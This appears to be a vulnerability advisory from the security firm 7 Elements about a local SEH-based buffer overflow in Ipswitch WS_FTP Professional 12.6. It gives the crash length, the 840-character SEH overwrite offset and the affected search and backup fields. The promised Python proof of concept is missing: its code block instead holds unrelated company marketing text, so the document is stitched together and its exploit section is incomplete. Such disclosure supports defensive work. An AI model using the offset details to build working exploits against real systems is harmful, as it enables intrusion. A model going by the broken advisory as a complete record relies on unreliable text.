A local buffer overflow vulnerability was discovered in Ipswitch WS\_FTP Professional version 12.6. This vulnerability was found in the “local search” component of the application. Entering a search string longer than 779 characters will cause the program to crash. It is possible to overwrite the structured exception handler (SEH) after an offset of 840 characters and hijack execution flow of the application. This issue also impacts the “backup location” field and was tested on a 32-bit Windows 7 host.

###

### PoC

The following proof of concept python script will generate a text file with a string to overwrite SEH. Once the file is generated, copy the contents of poc.txt and paste into the local search field to trigger the crash.

---

```

# Welcome to 7 Elements

We are a CREST accredited, independent IT security testing company providing expertise in technical information assurance through security testing, incident response and consultancy.

Offering completely impartial advice, our highly experienced team is here to guide you through the process, tailoring our service to your exact requirements, offering you the best and most flexible engagement for your business.

### **If you have an ongoing cyber incident call our triage team on 0131 235 2901**

Our core service offerings cover the following areas:

 [## Security Testing

![](https://www.7elements.co.uk/wp-content/uploads/2020/04/logo_color_crest.png)

At 7 Elements our approach to security testing is based on manual penetration testing techniques and goes further than doing a simple vulnerability scan. This approach, combined with our technical knowledge, ensures a deeper level of assurance and delivers pragmatic and tailored advice that is specific to the environment under test, backed up by our CREST accreditation for penetration testing services.](services/security-testing/)
[## Incident Response

![](https://www.7elements.co.uk/wp-content/uploads/2015/01/fingerprint-350x150.jpg)

Based upon our extensive industry experience and hands on knowledge gained through the response to security incidents and the delivery of security testing, we have developed a unique Event Driven Approach to incident response that combines incident response with attack led knowledge. If you have an ongoing cyber incident call our triage team on 0131 235 2901](/services/incident-response/)

## Cyber Attack Simulation

[![](https://www.7elements.co.uk/wp-content/uploads/2018/11/attack_1-300x166.jpg)](https://www.7elements.co.uk/wp-content/uploads/2018/11/attack_1.jpg)

Cyber Attack Simulation (often referred to as

Red Teaming or ‘scenario based testing’)

brings together our security testing and

threat knowledge gained through extensive

[incident response](https://www.7elements.co.uk/services/incident-response/) experience to generate

complex [scenario based testing engagements](https://www.7elements.co.uk/services/security-testing/).

The scenario goes beyond identifying how an

attacker will gain access, and tests your own

organisation’s capability to detect and respond to

a breach in real time.
